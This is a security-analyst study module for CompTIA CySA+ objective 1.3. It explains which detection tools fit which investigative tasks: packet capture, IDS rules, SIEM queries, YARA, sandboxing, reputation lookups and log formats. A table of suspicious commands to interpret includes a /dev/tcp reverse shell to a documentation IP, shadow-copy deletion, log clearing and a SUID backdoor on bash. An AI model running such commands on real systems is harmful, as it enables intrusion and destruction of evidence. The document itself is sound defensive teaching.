## Exam objective: 1.3

- **1.3** Given a scenario, use tools to determine malicious activity: decoding (CyberChef), packet analysis (Wireshark, tcpdump, Snort, Suricata, Zeek), SIEM, threat intelligence platforms (OTX, MISP, OpenCTI), EDR/XDR and MDM, domain and IP reputation (WHOIS, AbuseIPDB, GeoIP), file analysis (strings, VirusTotal, YARA), sandboxing (Joe Sandbox, Cuckoo), regular expressions and interpreting suspicious commands, email analysis (MXToolbox), UEBA (OpenUBA), JSON/XML/YAML/EVTX formats and scripting (Python, PowerShell, shell).

After this module you should be able to:

- choose the right tool for a given task (and say why the others are not the best);
- read the output of tcpdump, tshark, Suricata/Zeek logs, `strings` and YARA rules;
- safely decode and interpret obfuscated commands;
- check the reputation of a domain, IP address, file and message;
- recognize a data format and the tool you parse it with (jq, PowerShell, Python).

CompTIA likes PBQs in which you get a log or pcap and choose a tool or a conclusion. The key is knowing **what each tool does and what it does not do**. Here you are not learning the attack, but how to use tools to confirm or dismiss a suspicion.

## Tool map

| Task | Tool | Don't confuse with |
|---|---|---|
| Decode Base64, URL, hex, XOR, gzip | **CyberChef** | VirusTotal (reputation, not decoding) |
| Inspect packets with a GUI and follow stream | **Wireshark** | tcpdump (CLI, capture) |
| Capture traffic on a server without a GUI | **tcpdump** / tshark | Zeek (does not capture raw packets by default) |
| Signature-based network detection (IDS/IPS) | **Snort**, **Suricata** | Zeek (metadata, no inline blocking) |
| Logs of connections, DNS, HTTP, TLS, files | **Zeek** | Snort (rule-based alerts) |
| Correlating logs from many sources | **SIEM** | EDR (endpoint only) |
| Sharing and managing IoCs | **MISP**, **OpenCTI**, **OTX** | SIEM |
| Endpoint detection and response | **EDR**; across multiple domains **XDR** | MDM (device management) |
| Mobile device policies and posture | **MDM** | EDR |
| Domain owner and registration date | **WHOIS** | GeoIP |
| Abuse reports for an IP address | **AbuseIPDB** | WHOIS |
| Approximate location of an IP address | **GeoIP** | AbuseIPDB |
| Readable strings in a binary file | **strings** | YARA (rules) |
| Results of multiple AV engines for a hash | **VirusTotal** | sandbox |
| Rules to identify a malware family | **YARA** | Snort (network) |
| Observing behavior during execution | **Joe Sandbox**, **Cuckoo** | static analysis |
| Analyzing mail headers and DNS records | **MXToolbox** | VirusTotal |
| Deviations in user behavior | **UEBA** (OpenUBA) | fixed-threshold rules |

## Decoding and parsing: CyberChef

**CyberChef** (GCHQ) is a web tool with "recipes" (chains of operations): From Base64, URL Decode, From Hex, Gunzip, XOR, Decode text (UTF-16LE), Extract URLs/IPs, Defang. It runs locally in the browser, so it can be used offline without sending the sample to a third party.

Typical case: PowerShell `-EncodedCommand` is Base64 over **UTF-16LE** text. Recipe: `From Base64` → `Decode text (UTF-16LE)`. The same on Linux:

```bash
$ echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' \
    | base64 -d | iconv -f UTF-16LE -t UTF-8
IEX (New-Object Net.WebClient)
```

> **On the exam:** When you need to "deobfuscate" or "decode" a string (Base64, URL encoding, hex) to see what a command does, the answer is **CyberChef**. VirusTotal gives the reputation of a file/URL, and a sandbox shows behavior during execution.

## Packet analysis

### tcpdump and tshark

`tcpdump` captures and filters packets on the command line (BPF filters), `tshark` is Wireshark in the terminal with display filters.

```bash
# Capture traffic to/from the suspicious host into a file (ring buffer 10 x 100 MB)
$ tcpdump -i eth0 -nn -w /cases/ir42/host77-%Y%m%d%H%M.pcap -C 100 -W 10 host 10.0.5.77

# Quick look: SYN packets only
$ tcpdump -nn -r capture.pcap 'tcp[tcpflags] == tcp-syn' | head -3
09:02:11.104 IP 10.0.5.77.51544 > 10.0.1.20.22: Flags [S], seq 1180232, win 1024, length 0
09:02:11.104 IP 10.0.5.77.51544 > 10.0.1.20.80: Flags [S], seq 1180232, win 1024, length 0
09:02:11.105 IP 10.0.5.77.51544 > 10.0.1.20.443: Flags [S], seq 1180232, win 1024, length 0
```

The same source port, the same `seq` and `win 1024` for different destination ports are a typical fingerprint of a scanning tool, not of an ordinary client.

```bash
# Conversation and protocol statistics
$ tshark -r capture.pcap -q -z conv,ip
$ tshark -r capture.pcap -q -z io,phs

# HTTP requests: host, URI, User-Agent
$ tshark -r capture.pcap -Y http.request -T fields -e ip.src -e http.host -e http.request.uri -e http.user_agent
10.0.4.15  update-check.example.net  /gate.php?id=4f1a  Mozilla/4.0 (compatible; MSIE 6.0)

# TLS SNI for encrypted traffic
$ tshark -r capture.pcap -Y "tls.handshake.type==1" -T fields -e ip.dst -e tls.handshake.extensions_server_name
```

An outdated User-Agent (MSIE 6.0 in 2026) and `gate.php` are common indicators of a malware C2 panel.

| BPF (tcpdump, capture filter) | Wireshark display filter |
|---|---|
| `host 10.0.5.77` | `ip.addr == 10.0.5.77` |
| `port 53` | `dns` or `udp.port == 53` |
| `tcp[tcpflags] == tcp-syn` | `tcp.flags.syn == 1 && tcp.flags.ack == 0` |
| `src net 10.0.0.0/8 and dst port 443` | `ip.src == 10.0.0.0/8 && tcp.dstport == 443` |

### Wireshark

A GUI for in-depth analysis: **Follow TCP/HTTP stream** (reconstructing a conversation), **Statistics → Conversations / Endpoints / Protocol Hierarchy**, **Export Objects → HTTP** (extracting transferred files for hashing and analysis), Expert Info. On the exam it is the answer when you need to "reconstruct a session" or "extract a file from a pcap".

### Snort and Suricata

Rule-based network **IDS/IPS**. Snort is older; Suricata is multithreaded and, alongside alerts, generates **EVE JSON** with protocol metadata. Both can run **inline (IPS)** and block.

```text
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Suspicious old User-Agent to gate.php"; \
  flow:established,to_server; http.uri; content:"/gate.php"; http.user_agent; content:"MSIE 6.0"; \
  classtype:trojan-activity; sid:1000001; rev:1;)
```

```bash
$ jq -c 'select(.event_type=="alert") | {ts:.timestamp, src:.src_ip, dst:.dest_ip, sig:.alert.signature}' eve.json
{"ts":"2026-10-16T09:15:00Z","src":"10.0.4.15","dst":"198.51.100.23","sig":"Suspicious old User-Agent to gate.php"}
```

### Zeek

**Zeek** (formerly Bro) does not primarily work with signatures; instead it produces **structured logs** about everything it sees: `conn.log`, `dns.log`, `http.log`, `ssl.log`, `files.log`, `x509.log`, `notice.log`. It is excellent for threat hunting and retrospective analysis (e.g., searching for beaconing or rare JA3/JA4 fingerprints).

```text
#fields ts          uid    id.orig_h  id.resp_h      id.resp_p proto service duration orig_bytes resp_bytes
1760605500.01  C8x1   10.0.4.15  198.51.100.23  443       tcp   ssl     0.31     402        1210
1760605560.02  C9a2   10.0.4.15  198.51.100.23  443       tcp   ssl     0.30     402        1210
```

> **On the exam:** **Snort/Suricata** = an alert or block when traffic matches a rule (signature). **Zeek** = rich metadata about every connection for hunting and forensics. **Wireshark** = manual in-depth analysis of a single pcap. **tcpdump** = capture on a server without a GUI.

## SIEM and log analysis

A **SIEM** (Splunk, Elastic, Microsoft Sentinel, Wazuh, Graylog) collects, normalizes and correlates logs, runs rules and stores data for investigations. As in the SC-200 course with KQL, an analyst must know the basic query operations: filtering, aggregation, grouping by time and joining sources.

```text
# Splunk SPL: failed then successful logon from the same IP
index=wineventlog (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as fails count(eval(EventCode=4624)) as ok by src_ip, user
| where fails > 20 AND ok > 0
```

```text
// KQL (Sentinel): the same
SecurityEvent
| where EventID in (4624, 4625)
| summarize fails=countif(EventID==4625), ok=countif(EventID==4624) by IpAddress, Account
| where fails > 20 and ok > 0
```

A SIEM is not the same as SOAR (response automation, module 5) nor EDR (in-depth endpoint telemetry).

## Threat intelligence platforms

| Platform | What it is | When to choose it |
|---|---|---|
| **OTX** (AlienVault/LevelBlue Open Threat Exchange) | A free community with "pulse" IoC packages | A quick check whether an IoC is known to the community |
| **MISP** | An open-source platform for sharing IoCs between organizations (events, attributes, tags, TLP) | Exchange with an ISAC and partners, your own IoC database |
| **OpenCTI** | An open-source platform for structured threat knowledge in the **STIX 2.1** model (actors, campaigns, TTPs, relationships) | Analyzing actor–campaign–technique relationships, reports |

MISP and OpenCTI are often used together: MISP for operational indicator exchange, OpenCTI for context and the link to ATT&CK. Both export feeds to the SIEM and EDR. More on threat intel itself in module 4.

## Endpoint: EDR, XDR and MDM

- **EDR**: an agent records processes, connections, registry and file changes; provides the process tree, host isolation, file and memory collection, process termination (Defender for Endpoint, CrowdStrike, SentinelOne, Wazuh partially).
- **XDR**: correlates endpoint, identity, email, cloud and network into a single incident (Defender XDR from the SC-200 course).
- **MDM**: manages mobile devices and provides compliance status (rooted, outdated OS, missing encryption), remote lock and wipe. It is not a tool for in-depth process analysis.

> **On the exam:** "Need to see which process opened the connection and isolate the laptop from the network while keeping the connection to the console" → **EDR**. "Remotely wipe a lost company phone" → **MDM**. "Combine an alert from email, sign-in and endpoint into one incident" → **XDR**.

## Domain and IP reputation

```bash
$ whois cdn-sync.net | grep -Ei 'creation|registrar:|registrant country'
Creation Date: 2026-10-13T22:41:07Z        ← registered 3 days ago
Registrar: NameCheap, Inc.
Registrant Country: IS
```

- **WHOIS**: registrar, creation date, contact (often hidden by a privacy service). A **newly registered domain** is a strong signal for phishing and C2.
- **AbuseIPDB**: the community reports malicious IP addresses; you get an **Abuse Confidence Score**, categories (SSH brute force, port scan) and the number of reports.
- **GeoIP**: approximate location and ASN. Useful for impossible travel and geo-rules, but unreliable for VPN, Tor, mobile and cloud addresses. It is not proof of the attacker's identity.

## File analysis

### strings

```bash
$ strings -n 8 sample.bin | grep -Ei 'http|\.exe|cmd|powershell|HKEY' | head
http://198.51.100.23/gate.php
Software\Microsoft\Windows\CurrentVersion\Run
cmd.exe /c schtasks /create /tn Updater /tr
$ strings -el sample.bin | head    # UTF-16LE strings (common in Windows binaries)
```

Quick static triage: URLs, IP addresses, registry keys, file names. A packed file yields few meaningful strings, which is an indicator in itself.

### VirusTotal

Checks a **hash** (SHA-256) against dozens of AV engines, along with URL, domain and IP reputation and relationships. Rule: **search the hash first**; don't upload a confidential file, because the sample becomes available to other users (including an attacker watching whether it has been detected).

```bash
$ sha256sum sample.bin
9f2c...e41a  sample.bin
```

### YARA

**YARA** rules describe files through strings and conditions; they are used for malware classification, hunting across disks and in sandboxes.

```text
rule Suspicious_Downloader
{
  meta:
    author = "SOC"
    description = "PowerShell downloader with gate.php"
  strings:
    $a = "gate.php" ascii wide
    $b = "Net.WebClient" ascii wide nocase
    $c = { 4D 5A }   // MZ header
  condition:
    $c at 0 and all of ($a, $b)
}
```

```bash
$ yara -r suspicious.yar /cases/ir42/files/
Suspicious_Downloader /cases/ir42/files/p.exe
```

> **On the exam:** **YARA** = rules for **files/memory**; **Snort/Suricata** = rules for **network traffic**; **Sigma** (from the detection lab) = rules for **logs**. The question "write a rule that identifies variants of the same malware family on disks" calls for YARA.

## Sandboxing

A **sandbox** executes a sample in an isolated, instrumented VM and records its behavior: created processes, registry changes, files, network connections, DNS queries, screenshots. **Joe Sandbox** is commercial (with a cloud version), **Cuckoo** is open source (now maintained as CAPE/Cuckoo3). Limitations: malware that recognizes a VM or waits (sleep, checking for user activity) can stay "quiet", so a negative result is not proof that the file is harmless.

| Static analysis | Dynamic analysis |
|---|---|
| strings, hash, PE header, YARA | Sandbox, process and network monitoring |
| Safe, fast | Shows actual behavior |
| Fooled by obfuscation and packing | Malware can detect the sandbox |

## Pattern recognition

### Regular expressions

Regex is used in SIEM queries, grep, YARA and Snort rules. Exam examples:

| Regex | What it matches |
|---|---|
| `\b(?:\d{1,3}\.){3}\d{1,3}\b` | An IPv4 address (rough check) |
| `[A-Za-z0-9+/]{40,}={0,2}` | A long Base64 string |
| `\b[a-f0-9]{64}\b` | A SHA-256 hash |
| `(?i)powershell.*-e(nc)?\s` | PowerShell with an encoded command |
| `^[^@\s]+@[^@\s]+\.[a-z]{2,}$` | An email address |

```bash
$ grep -Eo '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' access.log | sort | uniq -c | sort -rn | head -3
   4120 203.0.113.45
    312 10.0.1.5
     40 192.0.2.10
```

### Interpreting suspicious commands

| Command (abbreviated) | What it means | Why it is suspicious |
|---|---|---|
| `powershell -nop -w hidden -enc JAB...` | Hidden window, no profile, encoded command | Obfuscation, avoiding the user's notice |
| `vssadmin delete shadows /all /quiet` | Deleting shadow copies | Ransomware preparation |
| `wevtutil cl Security` | Clearing the Security log | Covering tracks |
| `schtasks /create /sc minute /mo 5 /tr C:\Users\Public\u.exe` | Scheduled task every 5 min | Persistence |
| `net group "Domain Admins" /domain` | List of domain admins | AD reconnaissance |
| `bash -i >& /dev/tcp/198.51.100.23/4444 0>&1` | Interactive shell over TCP | Reverse shell |
| `echo ... \| base64 -d \| sh` | Decoding and executing | Obfuscated payload |
| `chmod +s /bin/bash` | SUID bit on a shell | Privilege escalation, backdoor |

## Email analysis: MXToolbox

**MXToolbox** checks a domain's MX, SPF, DKIM and DMARC records and blocklists, and analyzes **message headers** (the Received chain, delays, authentication results). The same records locally:

```bash
$ dig +short TXT corp.ba
"v=spf1 include:spf.protection.outlook.com -all"
$ dig +short TXT _dmarc.corp.ba
"v=DMARC1; p=reject; rua=mailto:dmarc@corp.ba"
```

Received headers are read **from the bottom up**: the bottom one is the first server that received the message from the sender.

## UEBA

**UEBA** (User and Entity Behavior Analytics) builds a behavioral profile of users and entities (host, service account) and flags deviations: a sign-in at an unusual time, access to an unusually large number of files, first access to a sensitive server. **OpenUBA** is an open-source UEBA framework. The advantage over fixed rules: it catches insiders and stolen credentials that "look legitimate".

## Data formats and scripting

| Format | Recognized by | Tool |
|---|---|---|
| **JSON** | `{"key": "value"}` (CloudTrail, EVE, most APIs) | `jq`, Python `json` |
| **XML** | `<Event><System>...` (Windows events, SAML, Nmap `-oX`) | `xmllint`, PowerShell `[xml]`, Python `ElementTree` |
| **YAML** | Indentation, `key: value` (Kubernetes, Sigma, CI pipeline) | `yq`, Python `yaml` |
| **EVTX** | Binary Windows event log | Event Viewer, `Get-WinEvent`, `wevtutil`, python-evtx, Chainsaw/Hayabusa |

```powershell
PS> Get-WinEvent -Path .\Security.evtx -FilterHashtable @{Id=4625} |
      Group-Object { $_.Properties[19].Value } | Sort-Object Count -Desc | Select -First 3 Count,Name
Count Name
----- ----
  812 203.0.113.45
```

```bash
$ jq -r '.Records[] | select(.eventName=="ConsoleLogin" and .responseElements.ConsoleLogin=="Failure") | .sourceIPAddress' ct.json | sort | uniq -c
     57 185.220.101.4
```

```python
import json, collections
c = collections.Counter()
for line in open("eve.json"):
    e = json.loads(line)
    if e.get("event_type") == "dns":
        c[e["dns"].get("rrname", "")] += 1
print(c.most_common(5))
```

> **On the exam:** Recognize the format by its appearance and choose the matching tool: CloudTrail and Suricata EVE are **JSON** (jq), Sigma and Kubernetes manifests are **YAML**, a Windows log file is **EVTX** (Get-WinEvent). A script that processes logs in a Windows environment is usually **PowerShell**, and on Linux **shell** or **Python**.

## Summary

- **CyberChef** decodes, **VirusTotal** gives reputation, a **sandbox** shows behavior, **strings** gives quick static triage, **YARA** applies rules to files.
- **tcpdump** captures, **Wireshark** analyzes in depth and extracts files, **Snort/Suricata** alert or block by signature, **Zeek** produces metadata for hunting.
- A **SIEM** correlates logs; queries filter, aggregate and join sources.
- **MISP** for IoC exchange, **OpenCTI** for STIX knowledge and relationships, **OTX** for a quick community check.
- **EDR** for the endpoint and isolation, **XDR** across multiple domains, **MDM** for mobile devices.
- **WHOIS** (domain age), **AbuseIPDB** (abuse reports), **GeoIP** (location, unreliable with VPN).
- **MXToolbox** for SPF/DKIM/DMARC and headers, **UEBA** for behavioral deviations.
- Regex and interpreting commands (`-enc`, `vssadmin delete shadows`, `wevtutil cl`, `/dev/tcp`) are mandatory skills.
- Formats: JSON (jq), XML, YAML, EVTX (Get-WinEvent); scripts in Python, PowerShell and shell.
